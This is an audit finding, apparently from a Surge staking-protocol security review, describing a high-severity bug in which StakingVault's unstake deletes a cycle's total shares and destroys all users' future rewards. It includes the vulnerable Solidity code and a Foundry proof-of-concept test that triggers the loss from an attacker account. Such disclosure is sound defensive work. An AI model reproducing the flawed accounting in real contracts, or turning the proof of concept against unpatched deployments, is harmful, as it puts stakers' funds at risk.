---
# Core Classification
protocol: Surge
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 55142
audit_firm: Shieldify
contest_link: none
source_link: https://github.com/shieldify-security/audits-portfolio-md/blob/main/Surge-Security-Review.md
github_link: none

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 1.00
financial_impact: high

# Scoring
quality_score: 5
rarity_score: 5

# Context Tags
tags:

protocol_categories:
  - liquid_staking
  - cdp
  - yield
  - services
  - cross_chain

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Shieldify Security
---

## Vulnerability Title

[H-03] Unstake Causes All Users to Lose Their Rewards

### Overview


The bug report talks about a problem with the `StakingVault.unstake()` function. The function is supposed to reduce the total amount of shares in the current cycle by the shares that are unstaked by the user. However, instead of doing that, the function deletes the total amount of shares from all stakes. This means that all users will lose their rewards for all future cycles. The report also includes a proof of concept that shows how the bug can be exploited. The team has fixed the issue and recommends reducing the total shares for the current cycle only with the number of shares being unstaked.

### Original Finding Content

## Severity

High Risk

## Description

The `StakingVault.unstake()` function should reduce the total amount of shares in the current cycle by the shares that get unstaked by the user. Instead, the total amount of shares from all stakes gets deleted.

## Location of Affected Code

File: [StakingVault.sol]()

```solidity
function _unstake(address user) internal returns (StakeInfo memory) {
    // code

    // Decrese total shares and close claimable rewards for every pool
    for (uint256 i; i < REWARD_POOL_COUNT; i++) {
        uint256 poolId = _rewardPools[i].id;
        uint256 cycleId = _rewardPools[i].currentCycleId;

        ClaimableReward storage r = _userRewardPoolClaimableReward[user][poolId];
        require(r.cycleStart != 0, "No claimable reward"); // This should never happen
        require(r.cycleEnd == 0, "Claimable reward is not active"); // This should never happen
        require(r.cycleStart <= cycleId, "Claimable reward is start cycle invalid"); // This should never happen

        // Close claimable reward entry - this results in `r.active() == false`
        r.cycleEnd = cycleId;

@>      uint256 shares = _rewardPoolShares[poolId][cycleId];

        // Decrese total shares for current pool cycle
@>      _rewardPoolShares[poolId][cycleId] -= shares;

        // If there are no claims possible for this user in this pool - remove the claimable reward entry
        if (r.cycleStart == r.cycleEnd) {
            delete _userRewardPoolClaimableReward[user][poolId];
        }
    }

    return info;
}
```

## Impact

Since the `claimRewardsToOwed()` calculates the reward of each user by using `_rewardPoolShares()` this results in the loss of rewards for all users for all future cycles.

## Proof of Concept

Place this snipped inside the `StakingVault.unstake.t.sol`:

```solidity
function test_unstake_lose_rewards_poc() public {
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    uint256 amount = 1000;
    uint16 period = 315; // days

    vm.startPrank(user);
    deal(address(stakingToken), user, amount);
    stakingToken.approve(address(uut), amount);
    uut.stake(amount, period);
    vm.stopPrank();

    vm.startPrank(attacker);
    deal(address(stakingToken), attacker, amount);
    stakingToken.approve(address(uut), amount);
    uut.stake(amount, 28);

    console.log("total shares  cycle 1: ", uut.totalShares(1, 1));

    skip(28 days + 10);
    console.log("skip 28 days");
    uut.endCycleIfNeeded();

    console.log("total shares  cycle 5: ", uut.totalShares(1, 5));

    uut.unstake();
    console.log("attacker unstakes");

    console.log("total shares  cycle 1: ", uut.totalShares(1, 1));
    console.log("total shares  cycle 5: ", uut.totalShares(1, 5));
    vm.stopPrank();

    uint256 daysUntilUserUnlock = period - 28;
    skip(daysUntilUserUnlock * 1 days);
    console.log("skip days: ", daysUntilUserUnlock);
    uut.endCycleIfNeeded();

    console.log("total shares  c5: ", uut.totalShares(1, 5));
    console.log("total shares  c12: ", uut.totalShares(1, 12));
}
```

## Recommendation

In the `unstake()` reduce the amount of the total shares for the current cycle only with the number of shares that are being unstaked.

## Team Response

Fixed.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 5/5 |
| Rarity Score | 5/5 |
| Audit Firm | Shieldify |
| Protocol | Surge |
| Report Date | N/A |
| Finders | Shieldify Security |

### Source Links

- **Source**: https://github.com/shieldify-security/audits-portfolio-md/blob/main/Surge-Security-Review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

